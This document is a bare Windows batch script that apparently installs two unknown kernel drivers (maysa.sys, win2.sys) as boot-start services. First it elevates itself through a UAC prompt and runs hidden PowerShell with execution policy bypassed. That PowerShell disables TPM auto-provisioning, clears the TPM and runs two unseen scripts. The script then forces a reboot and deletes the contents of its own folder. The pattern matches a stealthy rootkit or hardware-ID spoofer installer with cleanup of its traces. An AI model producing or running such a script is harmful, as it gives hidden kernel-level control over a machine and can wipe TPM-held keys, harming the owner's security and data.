@echo off
setlocal

openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)
set "system32Dir=C:\Windows\System32\"
if exist "%~dp0maysa.sys" (
    copy /y "%~dp0maysa.sys" "%system32Dir%"
)
if exist "%~dp0win2.sys" (
    copy /y "%~dp0win2.sys" "%system32Dir%"
)

powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Disable-TpmAutoProvisioning'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Clear-Tpm'"

powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%1.ps1\"'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%2.ps1\"'"


:: Set your service name here
set ServiceName=maysa

:: Driver file path relative to system root
set DriverPath=System32\maysa.sys

:: Create registry key for the service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /f

:: Set ImagePath (driver file)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v ImagePath /t REG_EXPAND_SZ /d "%DriverPath%" /f

:: Set Type = 1 (Kernel Driver)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Type /t REG_DWORD /d 1 /f

:: Set Start = 0 (Boot start)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Start /t REG_DWORD /d 0 /f

:: Set ErrorControl = 1 (Normal)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v ErrorControl /t REG_DWORD /d 1 /f

:: Set Group = Boot Bus Extender (optional for early load)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceName%" /v Group /t REG_SZ /d "Boot Bus Extender" /f


:: Set your service name here
set ServiceNamee=win2

:: Driver file path relative to system root
set DriverPathh=System32\win2.sys

:: Create registry key for the service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /f

:: Set ImagePath (driver file)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v ImagePath /t REG_EXPAND_SZ /d "%DriverPathh%" /f

:: Set Type = 1 (Kernel Driver)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Type /t REG_DWORD /d 1 /f

:: Set Start = 0 (Boot start)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Start /t REG_DWORD /d 0 /f

:: Set ErrorControl = 1 (Normal)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v ErrorControl /t REG_DWORD /d 1 /f

:: Set Group = Boot Bus Extender (optional for early load)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%ServiceNamee%" /v Group /t REG_SZ /d "Boot Bus Extender" /f


endlocal
C:\Windows\system32\cmd.exe /c shutdown /r /t 0

cd /d "%~dp0"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"
pause
